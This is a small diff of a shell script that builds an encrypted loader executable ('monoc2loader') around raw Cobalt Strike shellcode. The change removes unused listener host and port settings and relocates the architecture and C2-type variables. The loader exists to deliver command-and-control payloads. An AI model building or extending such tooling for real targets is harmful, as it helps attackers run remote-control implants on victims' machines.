@@ -4,15 +4,6 @@
 ## Use CS shellcode directly without donut 
 
 ## lhost and lport are not in use for this script, make sure arch is correct
-lhost="10.0.0.186"
-lport="9443"
-arch="x64"
-c2type="cobaltstrike"
-
-echo 'lhost: '$lhost
-echo 'lport: '$lport
-echo 'arch:  '$arch
-echo 'c2type:'$c2type
 
 mkdir tmp
 mkdir output
@@ -22,7 +13,10 @@ mkdir output
 # Choose Raw in Output area.
 ### Move the cs_payload.bin to folder input and rename to cs_payload.bin, then run the autogen script.
 
+arch="x64"
+c2type="cobaltstrike"
 rawscfilename='cs_payload.bin'
+
 rawscfilename_enc=$rawscfilename'.enc'
 final_cs_filename='monoc2loader_'$c2type'.cs'
 final_exe_filename='monoc2loader_'$c2type'_'$arch'.exe'
